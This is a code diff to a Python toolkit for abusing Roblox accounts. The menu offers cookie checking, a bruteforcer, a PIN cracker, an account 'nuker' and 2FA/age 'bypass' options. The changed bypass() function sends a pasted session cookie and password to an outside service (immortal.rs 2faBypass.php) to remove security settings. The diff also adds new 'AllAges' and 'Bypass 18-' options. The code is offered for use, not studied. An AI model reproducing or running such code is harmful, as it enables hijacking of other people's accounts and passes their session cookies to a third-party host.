@@ -8,7 +8,7 @@
 #
 # If you dont know python
 #########################################################################################################################
-# TODO: Create bypass method 
+# TODO: nothing:)
 #########################################################################################################################
 import ctypes
 ctypes.windll.kernel32.SetConsoleTitleW("Loading core modules...")
@@ -242,15 +242,12 @@ def masscheck():
 #using website cuz im lazy
 def bypass(cookie, type, password="12345678"):
     if type == "RemoveAll":
-        url = "https://immortal.rs/dashboard/api/misc/2faBypass.php"
+        url = "https://immortal.rs/api/misc/2faBypass.php"
         requests.Timeout = 999999999
         headers = {
             'Content-Type': 'application/json'
         }
-        payload = {
-            "Cookie": cookie,
-            "Type": type
-        }
+        payload = {"Cookie":cookie,"Type":"AgeV2","Password":password}
         
         try:
             response = requests.post(
@@ -259,13 +256,36 @@ def bypass(cookie, type, password="12345678"):
                 data=json.dumps(payload)
             )
             
-            response.raise_for_status()
             data = response.json()
             return data["msg"]
+
             os.system("pause")
         except requests.exceptions.RequestException as e:
             return e
             os.system("pause")
+    if type == "AllAges":
+        url = "https://immortal.rs/api/misc/2faBypass.php"
+        requests.Timeout = 999999999
+        headers = {
+            'Content-Type': 'application/json'
+        }
+        payload = {"Cookie":cookie,"Type":"Age","Password":password}
+        
+        try:
+            response = requests.post(
+                url,
+                headers=headers,
+                data=json.dumps(payload)
+            )
+            
+            data = response.json()
+            return data["msg"]
+            return response.text
+            os.system("pause")
+        except requests.exceptions.RequestException as e:
+            return e
+            os.system("pause")
+
     if type == "Age":
         url = "https://rblxbypasser.com/api/bypass"
         requests.Timeout = 999999999
@@ -868,7 +888,7 @@ def GetNumber():
     [2] Cookie checker     [ONLINE];                [7] Nucker           [ONLINE];                [12] Bypass age              [ONLINE];                 
     [3] Immortal           [ONLINE];                [8] BruteForcer      [OFFLINE];               [13] Bypass all              [ONLINE];            
     [4] Roblox Pin cracker [OFFLINE];               [9] free-item-buyer  [ONLINE];                [14] Cookie refresh          [ONLINE];                  
-    [5] Group finder       [ONLINE];                [10] Cookie Gen.     [OFFLINE];               [15] C# QMCC                 [ONLINE];  """), 1)  
+    [5] Group finder       [ONLINE];                [10] C# QMCC         [ONLINE];                [15] Bypass 18-              [ONLINE];  """), 1)  
     print(Printing)
     Number = int(Write.Input("Enter number: ", Colors.purple_to_blue, interval=0.0025))
     
@@ -985,7 +1005,7 @@ def GetNumber():
         print(getBanner())
         GetNumber()
          
-    elif Number == 15:
+    elif Number == 10:
         Write.Print("Waiting for open file...\n", Colors.purple_to_blue, interval=0.0025)
         time.sleep(2)
         YesNo = Write.Input("Do you want to download QuasarChecker? (y/n): ", Colors.red, interval=0.0025)
@@ -1084,6 +1104,27 @@ def GetNumber():
         parol = Write.Input(f"Cookie password: ", Colors.purple_to_blue, interval=0.0025)
         Write.Print("Bypassing (1-5 minutes)... \n", Colors.purple_to_blue, interval=0.0025)
         Write.Print(bypass(cooke, "18+", parol), Colors.purple_to_blue, interval=0.0025)
+        Write.Input("\n\nPress any key", Colors.purple_to_blue, interval=0.0025)
+        if os.name == "nt":
+            os.system("cls")
+        else:
+            os.system("clear")
+        print('')
+        print(getBanner())
+        GetNumber()
+    elif Number == 15:
+        Write.Print("Starting... \n", Colors.purple_to_blue, interval=0.0025)
+         
+        time.sleep(2)
+        if os.name == "nt":
+            os.system("cls")
+        else:
+            os.system("clear")
+        print(getBanner())
+        cooke = Write.Input(f"Cookie to bypass: ", Colors.purple_to_blue, interval=0.0025)
+        parol = Write.Input(f"Cookie password: ", Colors.purple_to_blue, interval=0.0025)
+        Write.Print("Bypassing (1-5 minutes)... \n", Colors.purple_to_blue, interval=0.0025)
+        Write.Print(bypass(cooke, "AllAges", parol), Colors.purple_to_blue, interval=0.0025)
         Write.Input("\n\nPress any key", Colors.purple_to_blue, interval=0.0025)
         if os.name == "nt":
             os.system("cls")
